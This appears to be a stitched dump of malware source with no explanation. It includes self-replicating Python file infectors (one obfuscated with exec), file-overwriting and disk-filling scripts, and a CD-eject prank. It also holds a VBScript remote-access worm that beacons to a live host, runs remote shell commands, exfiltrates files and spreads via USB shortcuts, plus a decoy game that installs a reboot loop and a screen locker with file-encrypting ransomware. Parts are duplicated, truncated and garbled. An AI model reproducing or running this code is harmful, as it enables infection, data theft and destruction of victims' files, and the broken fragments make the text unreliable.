  # ################
  # chaos.py
  # a Python virus
  # ###############
  
  # begin-78ea1850f48d1c1802f388db81698fd0
  
  import base64
  import glob
 import hashlib
 import inspect
 import os
 import random
 import zlib
 
 16def get_content_of_file(file):
   data = None
     # return the content of a file
   with open(file, "r") as my_file:
     data = my_file.readlines()
 
   return data
   
 def get_content_if_infectable(file, hash):
     # return the content of a file only if it hasn't been infected yet
   data = get_content_of_file(file)
 
   for line in data:
     if hash in line:
       return None
 
   return data
 
 def obscure(data: bytes) -> bytes:
     # obscure a stream of bytes compressing it and encoding it in base64
     return base64.urlsafe_b64encode(zlib.compress(data, 9))
 
 def transform_and_obscure_virus_code(virus_code):
     # transforms the virus code adding some randomic contents, compressing it and converting it in base64
   new_virus_code = []
   for line in virus_code:
     new_virus_code.append("# "+ str(random.randrange(1000000))+ "\n")
     new_virus_code.append(line + "\n")
 
   obscured_virus_code = obscure(bytes("".join(new_virus_code), 'utf-8'))
   return obscured_virus_code
 
 def find_files_to_infect(directory = "."):
   # find other files that can potentially be infected 
   return [file for file in glob.glob("*.py")]
 
 def summon_chaos():
   # the virus payload
   print("We are sick and complicated\nWe are chaos, we can't be cured")
 
 def infect(file, virus_code):
   # infect a single file. The routine open the file and if it's not been infected yet, infect the file with a custom version of the virus code
   hash = hashlib.md5(file.encode("utf-8")).hexdigest()
 
   if (data:=get_content_if_infectable(file, hash)):
     obscured_virus_code = transform_and_obscure_virus_code(virus_code)
     viral_vector = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode("+str(obscured_virus_code)+")))\")"
 
     with open(file, "w") as infected_file:
       infected_file.write("\n# begin-"+ hash + "\n" + viral_vector + "\n# end-" + hash + "\n")
       infected_file.writelines(data)
 
 def get_virus_code():
   # open the current file and returns the virus code, that is the code between the
   # begin-{hash} and the end-{hash} tags
   virus_code_on = False
   virus_code = []
 
   virus_hash = hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
   code = get_content_of_file(__file__)
 
   for line in code:
     if "# begin-" + virus_hash in line:
       virus_code_on = True
 
     if virus_code_on:
       virus_code.append(line + "\n")
 
     if "# end-" + virus_hash in line:
       virus_code_on = False
       break
 
   return virus_code
 
 # entry point
 
 try:
   # retrieve the virus code from the current infected script
   virus_code = get_virus_code()
 
   # look for other files to infect
   for file in find_files_to_infect():
     infect(file, virus_code)
 
  # call the payload
  summon_chaos()

except:
  pass

finally:
  # delete used names from memory
  for i in list(globals().keys()):
      if(i[0] != '_'):
          exec('del {}'.format(i))

  del i

 # begin-virus
 
 import glob
 
 def find_files_to_infect(directory = "."):
     return [file for file in glob.glob("*.py")]
 
 def get_content_of_file(file):
     data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data:=get_content_if_infectable(file)):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)

def get_virus_code():

    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus\n" in line:
            virus_code_on = False
            break

    return virus_code

def summon_chaos():
    # the virus payload
    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

# entry point 

try:
    # retrieve the virus code from the current infected script
    virus_code = get_virus_code() 

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    summon_chaos()

# except:
#     pass

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i

Set oWMP = CreateObject("WMPlayer.OCX.7") 

Set colCDROMs = oWMP.cdromCollection

do 

if colCDROMs.Count >= 1 then 

For i = 0 to colCDROMs.Count - 1 

colCDROMs.Item(i).Eject

Next 

For i = 0 to colCDROMs.Count - 1 

colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 
colCDROMs.Item(i).Eject 


Next 

End If 

wscript.sleep 500 

#!/usr/bin/python
import os
import datetime
SIGNATURE = "INFECTED"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        infected = False
        for line in open(path+"/"+fname):
            if SIGNATURE in line:
                infected = True
                break
        if infected == False:
            filestoinfect.append(path+"/"+fname)
        

    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = "You have been infected by a virus. To delete the virus, follow the instructions in the dmg file."
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring 
    virus.close
    for fname in filestoinfect:
        f = open(fname,"w")
        f.write(virusstring)
        f.close()
def bomb():
    if datetime.datetime.now().month == 12 and datetime.datetime.now().day == 25:
        print("ITS CHRISTMAS WHOO")
filestoinfect = search(os.path.abspath(input("Please type in the directory where your python files are at: ")))
infect(filestoinfect)
bomb()
import os
from faker import *
from time import sleep

fk = Faker()

version = 1.4
os.system('clear')
print("R    U     N")
print('[1] Get description of this file')
print('[2] Check for updates (recommended)')
print('[3] Run')
option_1 = float(input("Choose an option: "))

if option_1 == 1:
    print('RUN is a file which can run multiple apps, and do things that app store cannot. For example, RUN can pay for any app you want, find credit card numbers, and find information on any app. Removes and patches limitaitons on original app store.')

if option_1 == 2:
    print('Checking for updates...')
    if version == 1.2:
        sleep(0.2)
        print("No updates found.")
        print("All is good.")
    else:
        sleep(2)
        input("Update found, would you like to update now?")
        sleep(1)
        print("Updating...")
        sleep(2)
        print('Updated Succesfully!')
        sleep(1)
        print('ERROR!')
        sleep(0.5)
        print('Virus found!')
        sleep(0.2)
        print('Strange extension running "RUN.py" and accessing files.')
        sleep(0.01)
        print('Attempting auto-delete...')
        sleep(0.01)
        print('Deleting main data...')
        sleep(1)
        print('Auto-delete failed.')
        sleep(1)
        print('Attempting to delete small data...')
        sleep(1)
        print('Success!')
        sleep(1)
        print(fk.name())
        input('Do you reconinze this person? ➣')
        sleep(1)
        print('Deleting...')
        sleep(1)
        print("Other people linked found!")
        sleep(1)
        for j in range(10):
            print(fk.name())
            sleep(0.01)
        sleep(1)
        print('Suspicious adresses found!')
        sleep(0.01)
        print('Deleting...')
        sleep(0.01)
        for k in range(10):
            print(fk.address())
            sleep(0.01)
            print(fk.text())
        print('Deleted!')
        sleep(0.05)
        os.system('clear')

if option_1 == 3:
    print('This will check your python files to see if you have anything bad or any mispelledd / bad lines in your python code.')
    sleep(5)
    print('Checking your python files...')
    sleep(2)
    print('Unable to check your files. Please do the manual alternative.')
    import start


if option_1 == 4:
    print('infected')
    sleep(0.4)
    os.system('clear')
    import start

import java.io.*;
class Virus
{
public static void main(String ar[])
 {
   try
  {
   FileWriter f=new FileWriter("C:/WINDOWS/Virus.dll",true);
   while(true)
   {
   f.write("Programming Is Such A FUN !!!");
   }
  }
  catch(FileNotFoundException e){}
   catch(IOException e){}
 }
} 

# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

#!/usr/bin/env python
 
##### VIRUS BEGIN #####
import os, glob, sys, re
 
def getVirusFromSelf():
    "getVirusFromSelf - Returns the lines of the virus in a list"
    code = []
   fileHandle = open(sys.argv[0], "r")
   inVirus = False
   while 1:
       line = fileHandle.readline()
       if not line: break
       if re.search("^##### VIRUS BEGIN #####", line): inVirus = True
       if inVirus: code.append(line)
       if re.search("^##### VIRUS END #####", line): break
   fileHandle.close()
   return code
 
def getPythonList():
   "getPythonList - Return a list of Python programs"
   progs = glob.glob("*.py")
   return progs
 
def readFile(filename):
   "readFile - Returns a list of lines in a file"
   fileHandle = open(filename, "r")
   code = []
   while 1:
       line = fileHandle.readline()
       if not line: break
       code.append(line)
   fileHandle.close()
   return code
 
def isInfected(code):
   "isInfected - Returns True if infected, False if not"
   for line in code:
       if re.search("^##### VIRUS BEGIN #####", line): return True
   return False
 
def infectCode(progCode, virusCode):
   "infectCode - Inserts the virusCode into the progCode"
   code = []
   if re.search("^#!", progCode[0]): code.append(progCode.pop(0))
   for line in virusCode: code.append(line)
   for line in progCode: code.append(line)
   return code
 
def writeFile(filename, code):
   "writeFile - Write the lines in a list of code to a filename"
   fileHandle = open(filename, "w")
   for line in code:
       fileHandle.write(line)
   fileHandle.close()
 
def virusPayload():
   "virusPayload - Function for what the virus should do"
   pass
 
## Put functions together here ##
 
 
'<[ recoder : houdini (c) skype : houdini-fx ]>

'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

host = "bog5151.zapto.org"
port = 991
installdir = "%appdata%"
lnkfile = true
lnkfolder = true

'=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=

dim shellobj 
set shellobj = wscript.createobject("wscript.shell")
dim filesystemobj
set filesystemobj = createobject("scripting.filesystemobject")
dim httpobj
set httpobj = createobject("msxml2.xmlhttp")


'=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=

installname = wscript.scriptname
startup = shellobj.specialfolders ("startup") & "\"
installdir = shellobj.expandenvironmentstrings(installdir) & "\"
if not filesystemobj.folderexists(installdir) then  installdir = shellobj.expandenvironmentstrings("%temp%") & "\"
spliter = "<" & "|" & ">"
sleep = 5000 
dim response
dim cmd
dim param
info = ""
usbspreading = ""
startdate = ""
dim oneonce

'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
on error resume next


instance
while true

install

response = ""
response = post ("is-ready","")
cmd = split (response,spliter)
select case cmd (0)
case "excecute"
      param = cmd (1)
      execute param
case "update"
      param = cmd (1)
      oneonce.close
      set oneonce =  filesystemobj.opentextfile (installdir & installname ,2, false)
      oneonce.write param
      oneonce.close
      shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & chr(34)
      wscript.quit 
case "uninstall"
      uninstall
case "send"
      download cmd (1),cmd (2)
case "site-send"
      sitedownloader cmd (1),cmd (2)
case "recv"
      param = cmd (1)
      upload (param)
case  "enum-driver"
      post "is-enum-driver",enumdriver  
case  "enum-faf"
      param = cmd (1)
      post "is-enum-faf",enumfaf (param)
case  "enum-process"
      post "is-enum-process",enumprocess   
case  "cmd-shell"
      param = cmd (1)
      post "is-cmd-shell",cmdshell (param)  
case  "delete"
      param = cmd (1)
      deletefaf (param) 
case  "exit-process"
      param = cmd (1)
      exitprocess (param) 
case  "sleep"
      param = cmd (1)
      sleep = eval (param)        
end select

wscript.sleep sleep

wend


sub install
on error resume next
dim lnkobj
dim filename
dim foldername
dim fileicon
dim foldericon

upstart
for each drive in filesystemobj.drives

if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true
    if  filesystemobj.fileexists (drive.path & "\" & installname)  then
        filesystemobj.getfile(drive.path & "\"  & installname).attributes = 2+4
    end if
    for each file in filesystemobj.getfolder( drive.path & "\" ).Files
        if not lnkfile then exit for
        if  instr (file.name,".") then
            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then
                file.attributes = 2+4
                if  ucase (file.name) <> ucase (installname) then
                    filename = split(file.name,".")
                    set lnkobj = shellobj.createshortcut (drive.path & "\"  & filename (0) & ".lnk") 
                    lnkobj.windowstyle = 7
                    lnkobj.targetpath = "cmd.exe"
                    lnkobj.workingdirectory = ""
                    lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit"
                    fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\") 
                    if  instr (fileicon,",") = 0 then
                        lnkobj.iconlocation = file.path
                    else 
                        lnkobj.iconlocation = fileicon
                    end if
                    lnkobj.save()
                end if
            end if
        end if
    next
    for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
        if not lnkfolder then exit for
        folder.attributes = 2+4
        foldername = folder.name
        set lnkobj = shellobj.createshortcut (drive.path & "\"  & foldername & ".lnk") 
        lnkobj.windowstyle = 7
        lnkobj.targetpath = "cmd.exe"
        lnkobj.workingdirectory = ""
        lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit"
        foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
        if  instr (foldericon,",") = 0 then
            lnkobj.iconlocation = folder.path
        else 
            lnkobj.iconlocation = foldericon
        end if
        lnkobj.save()
    next
end If
end If
end if
next
err.clear
end sub

sub uninstall
on error resume next
dim filename
dim foldername

shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
filesystemobj.deletefile startup & installname ,true
filesystemobj.deletefile wscript.scriptfullname ,true

for  each drive in filesystemobj.drives
if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    for  each file in filesystemobj.getfolder ( drive.path & "\").files
         on error resume next
         if  instr (file.name,".") then
             if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then
                 file.attributes = 0
                 if  ucase (file.name) <> ucase (installname) then
                     filename = split(file.name,".")
                     filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" )
                 else
                     filesystemobj.deletefile (drive.path & "\" & file.name)
                 end If
             else
                 filesystemobj.deletefile (file.path) 
             end if
         end if
     next
     for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
         folder.attributes = 0
     next
end if
end if
end if
next
wscript.quit
end sub

function post (cmd ,param)

post = param
httpobj.open "post","http://" & host & ":" & port &"/" & cmd, false
httpobj.setrequestheader "user-agent:",information
httpobj.send param
post = httpobj.responsetext
end function

function information
on error resume next
if  inf = "" then
    inf = hwid & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%computername%") & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%username%") & spliter

    set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
    set os = root.execquery ("select * from win32_operatingsystem")
    for each osinfo in os
       inf = inf & osinfo.caption & spliter  
       exit for
    next
    inf = inf & "plus" & spliter
    inf = inf & security & spliter
    inf = inf & usbspreading
    information = inf  
else
    information = inf
end if
end function


sub upstart ()
on error resume Next

shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B "  & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
filesystemobj.copyfile wscript.scriptfullname,installdir & installname,true
filesystemobj.copyfile wscript.scriptfullname,startup & installname ,true

end sub


function hwid
on error resume next

set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set disks = root.execquery ("select * from win32_logicaldisk")
for each disk in disks
    if  disk.volumeserialnumber <> "" then
        hwid = disk.volumeserialnumber
        exit for
    end if
next
end function


function security 
on error resume next

security = ""

set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
for each objitem in colitems
    versionstr = split (objitem.version,".")
next
versionstr = split (colitems.version,".")
osversion = versionstr (0) & "."
for  x = 1 to ubound (versionstr)
	 osversion = osversion &  versionstr (i)
next
osversion = eval (osversion)
if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"

set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)

for each objantivirus in colantivirus
    security  = security  & objantivirus.displayname & " ."
next
if security  = "" then security  = "nan-av"
end function


function instance
on error resume next

usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\")
if usbspreading = "" then
   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &  lcase(installname) then
      usbspreading = "true - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
   else
      usbspreading = "false - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"

   end if
end If



upstart
set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
set installfullnameshort =  filesystemobj.getfile (installdir & installname)
if  lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then 
    shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34)
    wscript.quit 
end If
err.clear
set oneonce = filesystemobj.opentextfile (installdir & installname ,8, false)
if  err.number > 0 then wscript.quit
end function


sub sitedownloader (fileurl,filename)

strlink = fileurl
strsaveto = installdir & filename
set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run objfsodownload.getfile (strsaveto).shortpath
end if 
end sub

sub download (fileurl,filedir)

if filedir = "" then 
   filedir = installdir
end if

strsaveto = filedir & mid (fileurl, instrrev (fileurl,"\") + 1)
set objhttpdownload = createobject("msxml2.xmlhttp")
objhttpdownload.open "post","http://" & host & ":" & port &"/" & "is-sending" & spliter & fileurl, false
objhttpdownload.send ""
     
set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
if  objhttpdownload.status = 200 then
    dim  objstreamdownload
	set  objstreamdownload = createobject("adodb.stream")
    with objstreamdownload 
		 .type = 1 
		 .open
		 .write objhttpdownload.responsebody
		 .savetofile strsaveto
		 .close
	end with
    set objstreamdownload  = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run objfsodownload.getfile (strsaveto).shortpath
end if 
end sub


function upload (fileurl)

dim  httpobj,objstreamuploade,buffer
set  objstreamuploade = createobject("adodb.stream")
with objstreamuploade 
     .type = 1 
     .open
	 .loadfromfile fileurl
	 buffer = .read
	 .close
end with
set objstreamdownload = nothing
set httpobj = createobject("msxml2.xmlhttp")
httpobj.open "post","http://" & host & ":" & port &"/" & "is-recving" & spliter & fileurl, false
httpobj.send buffer
end function


function enumdriver ()

for  each drive in filesystemobj.drives
if   drive.isready = true then
     enumdriver = enumdriver & drive.path & "|" & drive.drivetype & spliter
end if
next
end Function

function enumfaf (enumdir)

enumfaf = enumdir & spliter
for  each folder in filesystemobj.getfolder (enumdir).subfolders
     enumfaf = enumfaf & folder.name & "|" & "" & "|" & "d" & "|" & folder.attributes & spliter
next

for  each file in filesystemobj.getfolder (enumdir).files
     enumfaf = enumfaf & file.name & "|" & file.size  & "|" & "f" & "|" & file.attributes & spliter

next
end function


function enumprocess ()

on error resume next

set objwmiservice = getobject("winmgmts:\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_process",,48)

dim objitem
for each objitem in colitems
	enumprocess = enumprocess & objitem.name & "|"
	enumprocess = enumprocess & objitem.processid & "|"
    enumprocess = enumprocess & objitem.executablepath & spliter
next
end function

sub exitprocess (pid)
on error resume next

shellobj.run "taskkill /F /T /PID " & pid,7,true
end sub

sub deletefaf (url)
on error resume next

filesystemobj.deletefile url
filesystemobj.deletefolder url

end sub

function cmdshell (cmd)

dim httpobj,oexec,readallfromany

set oexec = shellobj.exec ("%comspec% /c " & cmd)
if not oexec.stdout.atendofstream then
   readallfromany = oexec.stdout.readall
elseif not oexec.stderr.atendofstream then
   readallfromany = oexec.stderr.readall
else 
   readallfromany = ""
end if

cmdshell = readallfromany
' Option Explicit
On Error Resume Next

Set oFileSystem = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' Install the reboot script
app_data = WshShell.ExpandEnvironmentStrings("%APPDATA%")
full_install = app_data & "\winupdate.bat"
If Not oFileSystem.FileExists(full_install) Then
	Set reboot_script = oFileSystem.CreateTextFile(full_install)
	reboot_script.WriteLine("shutdown -r -t 00")
	reboot_script.Close()
	WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update", full_install, "REG_SZ"
	
	Set rs_map = oFileSystem.GetFile(full_install)
	rs_map.Attributes = 2
End If

' Decoy game to execute

' This game is a slightly modified version of the random number game in the book:
' Microsoft WSH and VBScript Programming for the Absolute Beginner (2014, ch. 6)
Sub NumbersGame
	done = False
	total_guesses = 0
	Randomize
	target = FormatNumber(Int((100 * Rnd) + 1))
	Do Until done
		input = InputBox("Type your guess:", "Pick a number between 1 and 100")
		total_guesses = total_guesses + 1	
		If Len(input) <> 0 Then
			If IsNumeric(input) Then
				If FormatNumber(input) = target Then
					MsgBox("Yes, the random number is " & input & " and it took you " & total_guesses & " guesses to get there!")
					done = True
				End If
				If FormatNumber(input) < target Then
					MsgBox("Your guess is too small")
				End If
				If FormatNumber(input) > target Then
					MsgBox("You guess is too large")
				End If
			Else
				MsgBox("Please enter in a number.")
			End If
		Else
			MsgBox("Please play again soon!")
			done = True
		End If
	Loop
End Sub
Call NumbersGame

CreateObject("WScript.shell").run "cmd /c %temp%\help.bat", 0, False
CreateObject("WScript.shell").run "cmd /c %temp%\help.bat", 0, False
pip install pyAesCrypt
pip install pyautogui
pip install tkinter
import pyautogui
from tkinter import Tk, Entry, Label
from pyautogu соi import click, moveTo
from time import sleep

# Create window
root = Tk()
# Disable protection of the upper left corner of the screen
pyautogui.FAILSAFE = False
# Get window width and height
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
# Set the window title
root.title('From "Xakep" with love')
# Make the window full-screen
root.attributes("-fullscreen", True)
# Create entry field, set its size and location
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)
# Create text captions and set their location
label0 = Label(root, text="╚(•⌂•)╝ Locker by Xakep (╯°□°）╯︵ ┻━┻", font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Enter password and press Ctrl + C", font='Arial 20')
label1.place(x=width/2-75-130, y=height/2-25-100)
# Enable continuous updates of the window and pause on
root.update()
sleep(0.2)
# Click in the center of the window
click(width/2, height/2)
# Reset the key to zero
k = False
# Continuously check if the right key is entered
# If the right key is entered, call the hooligan function
while not k:
    on_closing()

    import pythoncom, pyHook
hm = pyHook.HookManager()
hm.MouseAll = uMad
hm.KeyAll = uMad
hm.HookMouse()
hm.HookKeyboard()
pythoncom.PumpMessages()

def callback(event):
    global k, entry
    if entry.get() == "xakep":
        k = True

def on_closing():
    # Click in the center of the screen
    click(width/2, height/2)
    # Move the cursor to the center of the screen
    moveTo(width/2, height/2)
    # Enable full-screen mode
    root.attributes("-fullscreen", True)
    # If the user attempts to close the window from the Task Manager, call on_closing
    root.protocol("WM_DELETE_WINDOW", on_closing)
    # Enable continuous updating of the window
    root.update()
    # Add a key combination that closes the program
    root.bind('<Control-KeyPress-c>', callback)

direct = input("Specify the target directory: ")
password = input("Enter the password: ")
with open("Crypt.py", "w") as crypt:
    crypt.write('''
    program code
    ''')
import os
import sys

def crypt(file):
    import pyAesCrypt
    print('-' * 80)
    # Set password and buffer size
    password = "'''+str(password)+'''"
    buffer_size = 512*1024
    # Call encryption function
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)
    print("[Encrypt] '"+str(file)+".crp'")
    # Remove the original file
    os.remove(file)

def walk(dir):
    # Parse all subfolders in the given folder
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        # If this is a file, encrypt it
        if os.path.isfile(path):
            crypt(path)
        # If this is a folder, repeat recursively
        else:
            walk(path)

walk("'''+str(direct)+'''")
os.remove(str(sys.argv[0]))
'<[ recoder : houdini (c) skype : houdini-fx ]>

'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

host = "bog5151.zapto.org"
port = 991
installdir = "%appdata%"
lnkfile = true
lnkfolder = true

'=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=

dim shellobj 
set shellobj = wscript.createobject("wscript.shell")
dim filesystemobj
set filesystemobj = createobject("scripting.filesystemobject")
dim httpobj
set httpobj = createobject("msxml2.xmlhttp")


'=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=

installname = wscript.scriptname
startup = shellobj.specialfolders ("startup") & "\"
installdir = shellobj.expandenvironmentstrings(installdir) & "\"
if not filesystemobj.folderexists(installdir) then  installdir = shellobj.expandenvironmentstrings("%temp%") & "\"
spliter = "<" & "|" & ">"
sleep = 5000 
dim response
dim cmd
dim param
info = ""
usbspreading = ""
startdate = ""
dim oneonce

'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
on error resume next


instance
while true

install

response = ""
response = post ("is-ready","")
cmd = split (response,spliter)
select case cmd (0)
case "excecute"
      param = cmd (1)
      execute param
case "update"
      param = cmd (1)
      oneonce.close
      set oneonce =  filesystemobj.opentextfile (installdir & installname ,2, false)
      oneonce.write param
      oneonce.close
      shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & chr(34)
      wscript.quit 
case "uninstall"
      uninstall
case "send"
      download cmd (1),cmd (2)
case "site-send"
      sitedownloader cmd (1),cmd (2)
case "recv"
      param = cmd (1)
      upload (param)
case  "enum-driver"
      post "is-enum-driver",enumdriver  
case  "enum-faf"
      param = cmd (1)
      post "is-enum-faf",enumfaf (param)
case  "enum-process"
      post "is-enum-process",enumprocess   
case  "cmd-shell"
      param = cmd (1)
      post "is-cmd-shell",cmdshell (param)  
case  "delete"
      param = cmd (1)
      deletefaf (param) 
case  "exit-process"
      param = cmd (1)
      exitprocess (param) 
case  "sleep"
      param = cmd (1)
      sleep = eval (param)        
end select

wscript.sleep sleep

wend


sub install
on error resume next
dim lnkobj
dim filename
dim foldername
dim fileicon
dim foldericon

upstart
for each drive in filesystemobj.drives

if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true
    if  filesystemobj.fileexists (drive.path & "\" & installname)  then
        filesystemobj.getfile(drive.path & "\"  & installname).attributes = 2+4
    end if
    for each file in filesystemobj.getfolder( drive.path & "\" ).Files
        if not lnkfile then exit for
        if  instr (file.name,".") then
            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then
                file.attributes = 2+4
                if  ucase (file.name) <> ucase (installname) then
                    filename = split(file.name,".")
                    set lnkobj = shellobj.createshortcut (drive.path & "\"  & filename (0) & ".lnk") 
                    lnkobj.windowstyle = 7
                    lnkobj.targetpath = "cmd.exe"
                    lnkobj.workingdirectory = ""
                    lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit"
                    fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\") 
                    if  instr (fileicon,",") = 0 then
                        lnkobj.iconlocation = file.path
                    else 
                        lnkobj.iconlocation = fileicon
                    end if
                    lnkobj.save()
                end if
            end if
        end if
    next
    for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
        if not lnkfolder then exit for
        folder.attributes = 2+4
        foldername = folder.name
        set lnkobj = shellobj.createshortcut (drive.path & "\"  & foldername & ".lnk") 
        lnkobj.windowstyle = 7
        lnkobj.targetpath = "cmd.exe"
        lnkobj.workingdirectory = ""
